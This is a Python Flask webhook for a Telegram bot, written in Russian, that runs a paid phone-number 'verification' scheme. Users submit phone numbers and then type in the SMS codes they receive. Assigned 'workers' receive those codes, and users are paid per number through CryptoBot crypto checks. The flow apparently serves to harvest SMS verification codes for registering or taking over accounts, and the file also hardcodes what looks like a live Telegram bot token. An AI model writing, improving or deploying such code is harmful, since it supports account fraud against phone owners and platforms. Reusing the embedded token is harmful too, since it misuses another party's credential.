import os, requests, json, threading, time, sqlite3, hashlib, hmac
from flask import Flask, request
from datetime import datetime
from functools import wraps

app = Flask(__name__)

# ===== НАСТРОЙКИ =====
TOKEN = "8897748741:AAG2f8sHicGX_wxGEBPm2gqgbULhkGp4weE"  # ЗАМЕНИ НА НОВЫЙ!
ADMIN = 5979001063
WORKERS = [5979001063]  # ID воркеров через запятую

# CryptoBot настройки (получить у @CryptoBot)
CRYPTO_TOKEN = "ВАШ_API_ТОКЕН_ОТ_CRYPTOBOT"
CRYPTO_API = "https://pay.crypt.bot/api"
# ===========================

URL = f"https://api.telegram.org/bot{TOKEN}/"

# === БАЗА ДАННЫХ ===
def init_db():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    
    # Пользователи
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        balance REAL DEFAULT 0,
        registered_at TIMESTAMP,
        total_earned REAL DEFAULT 0,
        total_withdrawn REAL DEFAULT 0
    )''')
    
    # Телефоны (уникальные)
    c.execute('''CREATE TABLE IF NOT EXISTS phones (
        phone TEXT PRIMARY KEY,
        user_id INTEGER,
        verified_at TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(user_id)
    )''')
    
    # Заявки на верификацию
    c.execute('''CREATE TABLE IF NOT EXISTS verify_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        phone TEXT,
        worker_id INTEGER,
        code TEXT,
        status TEXT,
        created_at TIMESTAMP,
                completed_at TIMESTAMP,
        reward REAL DEFAULT 50,
        FOREIGN KEY (user_id) REFERENCES users(user_id)
    )''')
    
    # Заявки на вывод
    c.execute('''CREATE TABLE IF NOT EXISTS withdraw_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        amount REAL,
        status TEXT,
        crypto_asset TEXT DEFAULT 'USDT',
        crypto_address TEXT,
        check_url TEXT,
        created_at TIMESTAMP,
        processed_at TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(user_id)
    )''')
    
    # История транзакций
    c.execute('''CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        amount REAL,
        type TEXT,
        description TEXT,
        created_at TIMESTAMP
    )''')
    
    # Воркеры
    c.execute('''CREATE TABLE IF NOT EXISTS workers (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        status TEXT DEFAULT 'free',
        current_request_id INTEGER,
        total_completed INTEGER DEFAULT 0,
        total_earned REAL DEFAULT 0,
        registered_at TIMESTAMP
    )''')
    
    conn.commit()
    conn.close()

init_db()

def db_query(query, params=(), fetchone=False, fetchall=False):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute(query, params)
    result = None
    if fetchone:
        result = c.fetchone()
    elif fetchall:
        result = c.fetchall()
    conn.commit()
    conn.close()
    return result

# === ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===
def обновить_баланс(user_id, amount, description, txn_type):
    """Обновляет баланс и добавляет транзакцию"""
    db_query("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
    db_query("INSERT INTO transactions (user_id, amount, type, description, created_at) VALUES (?, ?, ?, ?, ?)",
             (user_id, amount, txn_type, description, datetime.now().isoformat()))
    
    if amount > 0:
        db_query("UPDATE users SET total_earned = total_earned + ? WHERE user_id = ?", (amount, user_id))
    else:
        db_query("UPDATE users SET total_withdrawn = total_withdrawn + ? WHERE user_id = ?", (abs(amount), user_id))

def телефон_уже_верифицирован(phone):
    result = db_query("SELECT phone FROM phones WHERE phone = ?", (phone,), fetchone=True)
    return result is not None

def отправить(chat_id, text, клава=None, заменить=False):
    if заменить and chat_id in активные:
        msg_id = активные[chat_id]
        данные = {"chat_id": chat_id, "message_id": msg_id, "text": text}
        if клава: данные["reply_markup"] = json.dumps(клава)
        ответ = requests.post(URL + "editMessageText", data=данные)
        if ответ.status_code == 200:
            return
    данные = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if клава: данные["reply_markup"] = json.dumps(клава)
    ответ = requests.post(URL + "sendMessage", data=данные)
    if ответ.status_code == 200:
        рез = ответ.json()
        if "result" in рез:
            активные[chat_id] = рез["result"]["message_id"]

# === КРАСИВЫЕ КНОПКИ (цветные) ===
def кнопки_заявки(req_id, status):
    табл = {
        "new": [
            [{"text":"🔑 ВЗЯТЬ ЗАЯВКУ","callback_data":f"take_{req_id}","color":"primary"}]
        ],
        "code_requested": [
            [{"text":"📝 ВВЕСТИ КОД","callback_data":f"code_{req_id}","color":"primary"}]
        ],
        "code_received": [
            [{"text":"✅ ПРИНЯТЬ","callback_data":f"approve_{req_id}","color":"success"},{"text":"❌ ОТКЛОНИТЬ","callback_data":f"reject_{req_id}","color":"danger"}]
        ],
        "hold": [
            [{"text":"💸 ВЫПЛАТИТЬ","callback_data":f"pay_{req_id}","color":"success"}]
        ]
    }
    # Конвертируем цветные кнопки в формат Telegram
    kb = []
    for row in табл.get(status, []):
        new_row = []
        for btn in row:
            text = btn["text"]
            cb = btn["callback_data"]
            new_row.append({"text": text, "callback_data": cb})
        kb.append(new_row)
    return {"inline_keyboard": kb}

def меню_воркера():
    return {"keyboard": [
        [{"text":"📊 МОЙ СТАТУС"}],
        [{"text":"🏠 ГЛАВНОЕ МЕНЮ"}]
    ], "resize_keyboard": True, "one_time_keyboard": False}

def меню_пользователя():
    return {"keyboard": [
        [{"text":"📝 НОВАЯ ЗАЯВКА"}],
        [{"text":"💰 БАЛАНС"}, {"text":"💸 ВЫВЕСТИ"}],
        [{"text":"📋 ИСТОРИЯ"}, {"text":"📜 ВЫВОДЫ"}]
    ], "resize_keyboard": True, "one_time_keyboard": False}

def меню_админа():
    return {"keyboard": [
        [{"text":"📋 ВСЕ ЗАЯВКИ"}, {"text":"👥 ВОРКЕРЫ"}],
        [{"text":"💸 ЗАЯВКИ НА ВЫВОД"}, {"text":"📊 СТАТИСТИКА"}],
        [{"text":"🏠 ГЛАВНОЕ МЕНЮ"}]
    ], "resize_keyboard": True, "one_time_keyboard": False}

def главное_меню(user_id):
    if user_id == ADMIN:
        return меню_админа()
    elif user_id in WORKERS:
        return меню_воркера()
    else:
        return меню_пользователя()

# === CRYPTOBOT ===
def крипто_запрос(method, data=None):
    headers = {"Crypto-Pay-API-Token": CRYPTO_TOKEN, "Content-Type": "application/json"}
    try:
        response = requests.post(f"{CRYPTO_API}/{method}", headers=headers, json=data or {})
        return response.json()
    except:
        return None

def крипто_создать_чек(amount, user_id, asset="USDT"):
    result = крипто_запрос("createCheck", {"asset": asset, "amount": str(amount), "description": f"Вывод для пользователя {user_id}"})
    if result and result.get("ok"):
        return result["result"]["check_url"]
    return None

# === ОСНОВНАЯ ЛОГИКА ===
счетчик_заявок = 1
активные = {}
текущие_состояния = {}  # user_id -> {"state": "waiting_phone" or "waiting_withdraw_amount", "temp_data": {}}

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    data = request.get_json()
    
    if "message" in data:
        msg = data["message"]
        user_id = msg["from"]["id"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text")
        first_name = msg["from"].get("first_name", "")
        username = msg["from"].get("username", "")
        
        # Регистрация пользователя
        user = db_query("SELECT user_id FROM users WHERE user_id = ?", (user_id,), fetchone=True)
        if not user:
            db_query("INSERT INTO users (user_id, username, first_name, registered_at) VALUES (?, ?, ?, ?)",
                     (user_id, username, first_name, datetime.now().isoformat()))
        
        # Регистрация воркера
        if user_id in WORKERS:
            worker = db_query("SELECT user_id FROM workers WHERE user_id = ?", (user_id,), fetchone=True)
            if not worker:
                db_query("INSERT INTO workers (user_id, username, first_name, registered_at, status) VALUES (?, ?, ?, ?, ?)",
                         (user_id, username, first_name, datetime.now().isoformat(), "free"))
        
        # Команда /start
        if text == "/start":
            balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
            отправить(chat_id, f"✨ <b>ДОБРО ПОЖАЛОВАТЬ!</b> ✨\n\n💰 <b>Ваш баланс:</b> {balance}₽\n\n📌 Выберите действие в меню ниже:", главное_меню(user_id))
            return "ok", 200
        
        # Возврат в главное меню
        if text == "🏠 ГЛАВНОЕ МЕНЮ":
            balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
            отправить(chat_id, f"✨ <b>ГЛАВНОЕ МЕНЮ</b> ✨\n\n💰 <b>Баланс:</b> {balance}₽", главное_меню(user_id))
            return "ok", 200
        
        # Обработка состояний
        состояние = текущие_состояния.get(user_id, {}).get("state", "")
        
        # Ждем код от пользователя
        if состояние == "waiting_code":
            if text and text.isdigit() and len(text) == 4:
                req_id = текущие_состояния[user_id]["request_id"]
                req = db_query("SELECT * FROM verify_requests WHERE id = ? AND status = 'code_requested'", (req_id,), fetchone=True)
                if req:
                    db_query("UPDATE verify_requests SET code = ?, status = 'code_received' WHERE id = ?", (text, req_id))
                    отправить(chat_id, "✅ <b>КОД ОТПРАВЛЕН ВОРКЕРУ!</b>\n\nОжидайте подтверждения.", заменить=True)
                    worker_id = req[3]
                    отправить(worker_id, f"📝 <b>ПОЛУЧЕН КОД ДЛЯ ЗАЯВКИ #{req_id}</b>\n\n🔑 Код: <code>{text}</code>", кнопки_заявки(req_id, "code_received"))
                    текущие_состояния[user_id]["state"] = ""
            else:
                отправить(chat_id, "❌ <b>НЕВЕРНЫЙ ФОРМАТ</b>\n\nВведите 4 цифры кода:", заменить=True)
            return "ok", 200
        
        # Ждем сумму для вывода
        if состояние == "waiting_withdraw_amount":
            try:
                amount = float(text.replace(",", "."))
                if amount <= 0:
                    отправить(chat_id, "❌ <b>СУММА ДОЛЖНА БЫТЬ БОЛЬШЕ 0</b>", заменить=True)
                    return "ok", 200
                
                balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
                if amount > balance:
                    отправить(chat_id, f"❌ <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\n💰 Ваш баланс: {balance}₽", заменить=True)
                    return "ok", 200
                
                # Создаем чек в CryptoBot
                check_url = крипто_создать_чек(amount, user_id)
                if check_url:
                    # Создаем заявку на вывод
                    db_query("INSERT INTO withdraw_requests (user_id, amount, status, check_url, created_at) VALUES (?, ?, 'pending', ?, ?)",
                             (user_id, amount, check_url, datetime.now().isoformat()))
                    
                    # Уведомляем админа
                    отправить(ADMIN, f"💸 <b>ЗАЯВКА НА ВЫВОД</b>\n\n👤 <b>Пользователь:</b> @{username or first_name}\n💰 <b>Сумма:</b> {amount}₽\n🔗 <b>Чек:</b> {check_url}\n\n✅ Нажмите кнопку ниже, когда переведёте пользователю.",
                             {"inline_keyboard": [[{"text":"✅ ПОДТВЕРДИТЬ ВЫВОД", "callback_data":f"confirm_withdraw_{user_id}_{amount}"}]]})
                    
                    отправить(chat_id, f"✅ <b>ЗАЯВКА НА ВЫВОД СОЗДАНА!</b>\n\n💰 Сумма: {amount}₽\n🕐 Ожидайте подтверждения администратора.\n\nСредства временно заблокированы.", заменить=True)
                    
                    # Временно блокируем сумму
                    обновить_баланс(user_id, -amount, f"Вывод {amount}₽ (заблокировано)", "withdraw_pending")
                else:
                    отправить(chat_id, "❌ <b>ОШИБКА СОЗДАНИЯ ЧЕКА</b>\n\nПопробуйте позже.", заменить=True)
                
                текущие_состояния[user_id]["state"] = ""
            except:
                отправить(chat_id, "❌ <b>ОШИБКА</b>\n\nВведите число, например: 500", заменить=True)
            return "ok", 200
        
        # Ждем номер телефона
        if состояние == "waiting_phone":
            phone = text.strip()
            if phone.startswith("+") and len(phone) >= 10:
                if телефон_уже_верифицирован(phone):
                    отправить(chat_id, "❌ <b>ЭТОТ НОМЕР УЖЕ ПРОХОДИЛ ВЕРИФИКАЦИЮ!</b>\n\nКаждый номер можно подтвердить только 1 раз.", заменить=True)
                    текущие_состояния[user_id]["state"] = ""
                    return "ok", 200
                
                global счетчик_заявок
                req_id = счетчик_заявок
                счетчик_заявок += 1
                
                db_query("INSERT INTO verify_requests (id, user_id, phone, status, created_at, reward) VALUES (?, ?, ?, 'new', ?, ?)",
                         (req_id, user_id, phone, datetime.now().isoformat(), 50))
                
                отправить(chat_id, f"✅ <b>ЗАЯВКА #{req_id} СОЗДАНА!</b>\n\n📞 Номер: {phone}\n🕐 Ожидайте, скоро с вами свяжутся.", заменить=True)
                
                # Рассылаем свободным воркерам
                free_workers = db_query("SELECT user_id FROM workers WHERE status = 'free'", fetchall=True)
                for w in free_workers:
                    отправить(w[0], f"🆕 <b>НОВАЯ ЗАЯВКА #{req_id}</b>\n\n📞 Телефон: {phone}\n💰 Награда: 50₽\n\nНажмите кнопку ниже, чтобы взять заявку.", кнопки_заявки(req_id, "new"))
                
                текущие_состояния[user_id]["state"] = ""
            else:
                отправить(chat_id, "❌ <b>НЕВЕРНЫЙ ФОРМАТ</b>\n\nВведите номер в формате: +79001234567", заменить=True)
            return "ok", 200
        
        # Команды воркера
        if user_id in WORKERS:
            if text == "📊 МОЙ СТАТУС":
                worker = db_query("SELECT status, current_request_id, total_completed, total_earned FROM workers WHERE user_id = ?", (user_id,), fetchone=True)
                if worker[1]:
                    req = db_query("SELECT phone FROM verify_requests WHERE id = ?", (worker[1],), fetchone=True)
                    отправить(chat_id, f"📊 <b>СТАТУС ВОРКЕРА</b>\n\n📌 <b>Статус:</b> {'Занят' if worker[0] == 'busy' else 'Свободен'}\n📋 <b>Текущая заявка:</b> #{worker[1]} ({req[0] if req else '-'})\n✅ <b>Выполнено заявок:</b> {worker[2]}\n💰 <b>Заработано:</b> {worker[3]}₽")
                else:
                    отправить(chat_id, f"📊 <b>СТАТУС ВОРКЕРА</b>\n\n📌 <b>Статус:</b> Свободен\n✅ <b>Выполнено заявок:</b> {worker[2]}\n💰 <b>Заработано:</b> {worker[3]}₽")
                return "ok", 200
        
        # Команды админа
        if user_id == ADMIN:
            if text == "📋 ВСЕ ЗАЯВКИ":
                requests_db = db_query("SELECT id, user_id, phone, status, created_at FROM verify_requests ORDER BY id DESC LIMIT 20", fetchall=True)
                if not requests_db:
                    отправить(chat_id, "📭 <b>НЕТ ЗАЯВОК</b>", меню_админа())
                else:
                    msg = "<b>📋 ПОСЛЕДНИЕ ЗАЯВКИ</b>\n\n"
                    for r in requests_db:
                        status_emoji = {"new": "🆕", "code_requested": "⏳", "code_received": "📝", "hold": "🕐", "completed": "✅", "rejected": "❌"}
                        msg += f"{status_emoji.get(r[3], '❓')} <b>#{r[0]}</b> | {r[2]} | {r[3]}\n"
                    отправить(chat_id, msg, меню_админа())
            elif text == "👥 ВОРКЕРЫ":
                workers = db_query("SELECT user_id, username, first_name, status, total_completed FROM workers", fetchall=True)
                if not workers:
                    отправить(chat_id, "👥 <b>НЕТ ЗАРЕГИСТРИРОВАННЫХ ВОРКЕРОВ</b>\n\nДобавьте ID вручную в список WORKERS в коде.", меню_админа())
                else:
                    msg = "<b>👥 СПИСОК ВОРКЕРОВ</b>\n\n"
                    for w in workers:
                        msg += f"🆔 <code>{w[0]}</code> | @{w[1] or w[2]} | {'🟢 Свободен' if w[3] == 'free' else '🔴 Занят'} | ✅ {w[4]}\n"
                    отправить(chat_id, msg, меню_админа())
            elif text == "💸 ЗАЯВКИ НА ВЫВОД":
                pending = db_query("SELECT id, user_id, amount, check_url, created_at FROM withdraw_requests WHERE status = 'pending'", fetchall=True)
                if not pending:
                    отправить(chat_id, "💸 <b>НЕТ АКТИВНЫХ ЗАЯВОК НА ВЫВОД</b>", меню_админа())
                else:
                    msg = "<b>💸 ЗАЯВКИ НА ВЫВОД</b>\n\n"
                    for p in pending:
                        user = db_query("SELECT username, first_name FROM users WHERE user_id = ?", (p[1],), fetchone=True)
                        msg += f"🎫 <b>#{p[0]}</b> | @{user[0] or user[1]} | {p[2]}₽ | {p[3][:50]}...\n"
                    отправить(chat_id, msg, меню_админа())
            elif text == "📊 СТАТИСТИКА":
                total_users = db_query("SELECT COUNT(*) FROM users", fetchone=True)[0]
                total_requests = db_query("SELECT COUNT(*) FROM verify_requests", fetchone=True)[0]
                completed = db_query("SELECT COUNT(*) FROM verify_requests WHERE status = 'completed'", fetchone=True)[0]
                total_withdrawn = db_query("SELECT SUM(amount) FROM withdraw_requests WHERE status = 'completed'", fetchone=True)[0] or 0
                msg = f"<b>📊 СТАТИСТИКА БОТА</b>\n\n👥 <b>Пользователей:</b> {total_users}\n📋 <b>Всего заявок:</b> {total_requests}\n✅ <b>Выполнено:</b> {completed}\n💰 <b>Выведено:</b> {total_withdrawn}₽"
                отправить(chat_id, msg, меню_админа())
            return "ok", 200
        
        # Команды пользователя
        if text == "📝 НОВАЯ ЗАЯВКА":
            текущие_состояния[user_id] = {"state": "waiting_phone"}
            отправить(chat_id, "📞 <b>ВВЕДИТЕ НОМЕР ТЕЛЕФОНА</b>\n\nПример: <code>+79001234567</code>\n\n❗️ Каждый номер можно подтвердить только 1 раз.", заменить=True)
        elif text == "💰 БАЛАНС":
            balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
            total_earned = db_query("SELECT total_earned FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
            отправить(chat_id, f"💰 <b>ВАШ БАЛАНС</b>\n\n💎 <b>Доступно:</b> {balance}₽\n📈 <b>Всего заработано:</b> {total_earned}₽", заменить=True)
        elif text == "💸 ВЫВЕСТИ":
            balance = db_query("SELECT balance FROM users WHERE user_id = ?", (user_id,), fetchone=True)[0]
            if balance <= 0:
                отправить(chat_id, "❌ <b>НЕДОСТАТОЧНО СРЕДСТВ ДЛЯ ВЫВОДА</b>", заменить=True)
            else:
                текущие_состояния[user_id] = {"state": "waiting_withdraw_amount"}
                отправить(chat_id, f"💰 <b>ВАШ БАЛАНС: {balance}₽</b>\n\n💸 <b>ВВЕДИТЕ СУММУ ДЛЯ ВЫВОДА</b>\n\nМинимальная сумма: 100₽\nКомиссия: 0%", заменить=True)
        elif text == "📋 ИСТОРИЯ":
            history = db_query("SELECT phone, status, completed_at, reward FROM verify_requests WHERE user_id = ? ORDER BY id DESC LIMIT 10", (user_id,), fetchall=True)
            if not history:
                отправить(chat_id, "📭 <b>У ВАС НЕТ ЗАЯВОК</b>\n\nНажмите «НОВАЯ ЗАЯВКА», чтобы начать.", заменить=True)
            else:
                msg = "<b>📋 ИСТОРИЯ ЗАЯВОК</b>\n\n"
                for h in history:
                    status_emoji = {"completed": "✅", "rejected": "❌", "expired": "⏰"}
                    msg += f"{status_emoji.get(h[1], '❓')} <b>{h[0]}</b> | {h[3]}₽ | {h[2][:16] if h[2] else '-'}\n"
                отправить(chat_id, msg, заменить=True)
        elif text == "📜 ВЫВОДЫ":
            withdrawals = db_query("SELECT amount, status, created_at FROM withdraw_requests WHERE user_id = ? ORDER BY id DESC LIMIT 10", (user_id,), fetchall=True)
            if not withdrawals:
                отправить(chat_id, "📭 <b>У ВАС НЕТ ЗАЯВОК НА ВЫВОД</b>", заменить=True)
            else:
                msg = "<b>📜 ИСТОРИЯ ВЫВОДОВ</b>\n\n"
                for w in withdrawals:
                    status_emoji = {"pending": "⏳", "completed": "✅", "rejected": "❌"}
                    msg += f"{status_emoji.get(w[1], '❓')} <b>{w[0]}₽</b> | {w[2][:16]}\n"
                отправить(chat_id, msg, заменить=True)
    
    # Обработка нажатий на кнопки
    elif "callback_query" in data:
        cb = data["callback_query"]
        user_id = cb["from"]["id"]
        cb_data = cb["data"]
        callback_id = cb["id"]
        requests.post(URL + "answerCallbackQuery", data={"callback_query_id": callback_id})
        
        # Подтверждение вывода админом
        if cb_data.startswith("confirm_withdraw_"):
            if user_id != ADMIN:
                return "ok", 200
            parts = cb_data.split("_")
            target_user = int(parts[2])
            amount = float(parts[3])
            
            # Обновляем статус заявки
            db_query("UPDATE withdraw_requests SET status = 'completed', processed_at = ? WHERE user_id = ? AND amount = ? AND status = 'pending'",
                     (datetime.now().isoformat(), target_user, amount))
            
            # Добавляем транзакцию вывода (уже заблокирована)
            db_query("INSERT INTO transactions (user_id, amount, type, description, created_at) VALUES (?, ?, 'withdraw_completed', ?, ?)",
                     (target_user, -amount, f"Вывод {amount}₽ подтверждён", datetime.now().isoformat()))
            
            отправить(target_user, f"✅ <b>ВЫВОД ПОДТВЕРЖДЁН!</b>\n\n💰 Сумма: {amount}₽\n💸 Средства отправлены на указанный кошелёк.\n\nСпасибо за использование сервиса!")
            отправить(user_id, f"✅ <b>ВЫВОД ПОДТВЕРЖДЁН</b>\n\n👤 Пользователю @{cb_data} выплачено {amount}₽")
            return "ok", 200
        
        # Обработка заявок воркеров
        if user_id not in WORKERS and user_id != ADMIN:
            return "ok", 200
        
        action, req_id = cb_data.split("_")
        req_id = int(req_id)
        
        # Взять заявку
        if action == "take":
            req = db_query("SELECT status FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
            if not req or req[0] != "new":
                отправить(user_id, f"❌ <b>ЗАЯВКА #{req_id} УЖЕ НЕДОСТУПНА</b>\n\nЕё уже взял другой воркер.", заменить=True)
                return "ok", 200
            
            # Назначаем воркера
            db_query("UPDATE verify_requests SET worker_id = ?, status = 'code_requested' WHERE id = ?", (user_id, req_id))
            db_query("UPDATE workers SET status = 'busy', current_request_id = ? WHERE user_id = ?", (req_id, user_id))
            
            # Получаем данные заявки
            req_data = db_query("SELECT user_id, phone FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
            target_user = req_data[0]
            phone = req_data[1]
            
            текущие_состояния[target_user] = {"state": "waiting_code", "request_id": req_id}
            
            отправить(target_user, f"🔑 <b>ВОРКЕР ВЗЯЛ ВАШУ ЗАЯВКУ #{req_id}</b>\n\n📞 Телефон: {phone}\n\n<b>Введите код из SMS (4 цифры):</b>")
            отправить(user_id, f"✅ <b>ВЫ ВЗЯЛИ ЗАЯВКУ #{req_id}</b>\n\n📞 Телефон: {phone}\n⏳ Ожидайте код от пользователя...", кнопки_заявки(req_id, "code_requested"))
            
            # Уведомить остальных воркеров
            other_workers = db_query("SELECT user_id FROM workers WHERE status = 'free' AND user_id != ?", (user_id,), fetchall=True)
            for w in other_workers:
                отправить(w[0], f"❌ <b>ЗАЯВКА #{req_id} УЖЕ ВЗЯТА</b>", заменить=True)
            return "ok", 200
        
        # Принять код и запустить холд
        if action == "approve":
            req = db_query("SELECT status, user_id FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
            if not req or req[0] != "code_received":
                отправить(user_id, "⏳ <b>КОД ЕЩЁ НЕ ВВЕДЁН</b>\n\nПользователь ещё не ввёл код.", заменить=True)
                return "ok", 200
            
            # Ставим холд
            db_query("UPDATE verify_requests SET status = 'hold' WHERE id = ?", (req_id,))
            отправить(req[1], "✅ <b>КОД ПОДТВЕРЖДЁН!</b>\n\n🕐 СТАТУС: <b>ХОЛД 2 МИНУТЫ</b>\n\nОжидайте выплаты.", заменить=True)
            отправить(user_id, f"✅ <b>КОД ПОДТВЕРЖДЁН!</b>\n\n🕐 ЗАПУЩЕН ХОЛД 2 МИНУТЫ\n\n<b>Нажмите «ВЫПЛАТИТЬ» в течение 2 минут.</b>", кнопки_заявки(req_id, "hold"))
            
            # Таймер на 2 минуты
            def expire():
                req_check = db_query("SELECT status FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
                if req_check and req_check[0] == "hold":
                    db_query("UPDATE verify_requests SET status = 'expired' WHERE id = ?", (req_id,))
                    db_query("UPDATE workers SET status = 'free', current_request_id = NULL WHERE user_id = ?", (user_id,))
                    user_data = db_query("SELECT user_id FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
                    if user_data:
                        отправить(user_data[0], "⏰ <b>ВРЕМЯ ИСТЕКЛО!</b>\n\nЗаявка отменена.", заменить=True)
                    отправить(user_id, f"⏰ <b>ХОЛД ПО ЗАЯВКЕ #{req_id} ИСТЁК!</b>\n\nЗаявка отменена.")
            threading.Timer(120, expire).start()
            return "ok", 200
        
        # Выплатить
        if action == "pay":
            req = db_query("SELECT status, user_id, reward FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
            if not req or req[0] != "hold":
                отправить(user_id, "❌ <b>ЗАЯВКА НЕ В СТАТУСЕ ХОЛДА</b>", заменить=True)
                return "ok", 200
            
            # Завершаем заявку
            db_query("UPDATE verify_requests SET status = 'completed', completed_at = ? WHERE id = ?", (datetime.now().isoformat(), req_id))
            db_query("UPDATE workers SET status = 'free', current_request_id = NULL, total_completed = total_completed + 1, total_earned = total_earned + ? WHERE user_id = ?", (req[2], user_id))
            
            # Начисляем деньги пользователю
            обновить_баланс(req[1], req[2], f"Верификация номера (заявка #{req_id})", "verification")
            
            # Добавляем телефон в список верифицированных
            phone = db_query("SELECT phone FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)[0]
            db_query("INSERT OR IGNORE INTO phones (phone, user_id, verified_at) VALUES (?, ?, ?)", (phone, req[1], datetime.now().isoformat()))
            
            # Уведомления
            new_balance = db_query("SELECT balance FROM users WHERE user_id = ?", (req[1],), fetchone=True)[0]
            отправить(req[1], f"✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n💰 <b>Начислено:</b> {req[2]}₽\n💎 <b>Ваш баланс:</b> {new_balance}₽\n\nСпасибо за использование сервиса!", заменить=True)
            отправить(user_id, f"✅ <b>ВЫПЛАТА ПО ЗАЯВКЕ #{req_id} ПРОИЗВЕДЕНА!</b>\n\n💰 Пользователю начислено {req[2]}₽")
            return "ok", 200
        
        # Отказ
        if action == "reject":
            req = db_query("SELECT user_id FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
            if req:
                db_query("UPDATE verify_requests SET status = 'rejected' WHERE id = ?", (req_id,))
                db_query("UPDATE workers SET status = 'free', current_request_id = NULL WHERE user_id = ?", (user_id,))
                отправить(req[0], "❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nПопробуйте создать новую заявку.", заменить=True)
                отправить(user_id, f"❌ <b>ЗАЯВКА #{req_id} ОТКЛОНЕНА</b>")
            return "ok", 200
    
    return "ok", 200

@app.route("/")
def home():
    return "✅ Бот работает!", 200

if __name__ == "__main__":
    init_db()
    
    # Регистрируем воркеров из списка
    for wid in WORKERS:
        exists = db_query("SELECT user_id FROM workers WHERE user_id = ?", (wid,), fetchone=True)
        if not exists:
            db_query("INSERT INTO workers (user_id, status, registered_at) VALUES (?, 'free', ?)", (wid, datetime.now().isoformat()))
    
    # Устанавливаем вебхук
    host = os.environ.get("RENDER_EXTERNAL_HOSTNAME")
    if host:
        webhook_url = f"https://{host}/{TOKEN}"
        requests.post(URL + "deleteWebhook")
        requests.post(URL + "setWebhook", data={"url": webhook_url})
        print(f"✅ Webhook: {webhook_url}")
    
    app.run(host="0.0.0.0", port=10000)
